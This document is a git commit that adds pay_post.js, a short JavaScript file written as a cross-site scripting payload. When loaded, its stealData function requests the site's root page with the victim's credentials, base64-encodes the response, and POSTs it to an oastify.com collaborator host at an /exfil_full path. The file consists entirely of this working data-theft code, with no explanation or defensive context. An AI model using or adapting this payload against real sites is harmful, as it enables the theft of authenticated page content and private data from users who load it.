22162abdf421f2b69d1d1550f2aa9910d4c34d77
dmbas <d.mordasov@bastion-tech.ru>
2026-03-13 18:27:09 +0300

    Create pay_post.js

---
+++ pay_post.js
@@ -0,0 +1,25 @@
+function read_body(xhr) {
+    if (!xhr.responseType || xhr.responseType === "text") return xhr.responseText;
+    if (xhr.responseType === "document") return xhr.responseXML;
+    if (xhr.responseType === "json") return xhr.responseJSON;
+    return xhr.response;
+}
+function stealData() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "/", true);
+    xhr.withCredentials = true;
+    xhr.send(null);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            var exfilData = btoa(unescape(encodeURIComponent(read_body(xhr))));
+            fetch("https://od589wa03bfdzgwu8498z8ktakge45su.oastify.com/exfil_full", {
+                method: "POST",
+                mode: "no-cors",
+                credentials: "omit",
+                headers: { "Content-Type": "text/plain" },
+                body: exfilData
+            });
+        }
+    };
+}
+stealData();
